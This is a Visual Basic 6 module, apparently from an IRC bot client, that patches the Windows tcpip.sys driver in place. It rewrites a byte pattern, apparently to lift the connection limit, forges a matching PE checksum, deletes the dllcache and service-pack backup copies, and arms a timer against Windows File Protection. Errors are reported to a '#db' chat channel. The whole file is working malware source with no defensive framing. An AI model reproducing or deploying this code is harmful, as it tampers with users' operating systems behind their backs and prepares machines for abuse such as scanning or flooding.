Attribute VB_Name = "modPatchTCPIP"
Option Explicit

Private Declare Function MapFileAndCheckSumA Lib "imagehlp.dll" (ByVal Filename As String, ByRef HeaderSum As Long, ByRef CheckSum As Long) As Long

Public Sub PatchTCPIP()
    On Local Error GoTo ErrHand
    Dim intFileHandle As Integer
    Dim strData As String
    Dim strOutput As String
    Dim strTCPIPFile As String
    Dim strTCPIPFile2 As String
    Dim strTCPIPFile3 As String
    
    strTCPIPFile = Client.SystemDir & "\drivers\tcpip.sys"
    strTCPIPFile2 = Client.SystemDir & "\dllcache\tcpip.sys"
    strTCPIPFile3 = Client.WindowsDir & "\SERVICEPACKFILES\I386\tcpip.sys"
    
    Call SaveSetting("config.PatchedTCPIP", "1")
    
    intFileHandle = FreeFile
    Open strTCPIPFile For Binary As #intFileHandle
    strData = Space$(LOF(intFileHandle))
    Get #intFileHandle, , strData
    Close #intFileHandle
    
    Dim lngPos As Long
    lngPos = InStr(1, strData, Chr$(199) & Chr$(5) & Chr$(28))
    If lngPos = 0 Then
        lngPos = InStr(1, strData, Chr$(199) & Chr$(5) & Chr$(60))
    End If
    
    'shouldn't happen... if it does there must be a new pattern
    If lngPos = 0 Then Exit Sub
    
    'patch it
    lngPos = lngPos + 6
    strOutput = Left$(strData, lngPos - 1) & Chr$(255) & Chr$(255) & Chr$(240) & Right$(strData, Len(strData) - lngPos - 2)
    
    'write new file
    intFileHandle = FreeFile
    Open strTCPIPFile & ".new" For Binary Access Write As #intFileHandle
    Put #intFileHandle, , strOutput
    Close #intFileHandle
    
    'fix CRC header
    Dim lngOldsum As Long
    Dim strOldsum As String
    Dim lngNewsum As Long
    Dim strNewsum As String
    
    Call MapFileAndCheckSumA(strTCPIPFile, lngOldsum, 0&)
    Call MapFileAndCheckSumA(strTCPIPFile & ".new", 0&, lngNewsum)
    
    If lngNewsum = 0 Or lngOldsum = 0 Then Exit Sub
    
    strOldsum = PEConvCRC(Hex$(lngOldsum))
    strNewsum = PEConvCRC(Hex$(lngNewsum))
    
    strOutput = Replace$(strOutput, strOldsum, strNewsum, , 1)
    
    'delete dllcache file
    Call DeleteFile(strTCPIPFile2)
    
    'write patched & CRC corrected file to dllcache
    intFileHandle = FreeFile
    Open strTCPIPFile & ".new" For Binary Access Write As #intFileHandle
    Put #intFileHandle, , strOutput
    Close #intFileHandle
    
    Call DeleteFile(strTCPIPFile3)
    Call DeleteFile(strTCPIPFile2)
    Call DeleteFile(strTCPIPFile)
    DoEvents
    
    If FileExists(strTCPIPFile2) Then Call FileCopy(strTCPIPFile & ".new", strTCPIPFile2)
    If FileExists(strTCPIPFile3) Then Call FileCopy(strTCPIPFile & ".new", strTCPIPFile3)
    Name strTCPIPFile & ".new" As strTCPIPFile
    
    'watch out for windows file protection :O
    frmMain.tmrWatchWFP.Enabled = True
    
    Exit Sub
ErrHand:
    DirectMsgChan "PatchTCPIP #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Function PEConvCRC(ByVal strCRC As String) As String
    On Local Error GoTo ErrHand
    'convert CRC string to go in PE header :O
    Dim lngLen As Long
    Dim strOutput As String
    Dim i As Long
    
    lngLen = Len(strCRC)
    If lngLen <> 8 Then
        strCRC = String$(8 - lngLen, "0") & strCRC
    End If
        
    For i = 7 To 1 Step -2
        strOutput = strOutput & Chr(CLng("&H" & Mid$(strCRC, i, 2)))
    Next
    PEConvCRC = strOutput
    
    Exit Function
ErrHand:
    DirectMsgChan "PEConvCRC #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Function
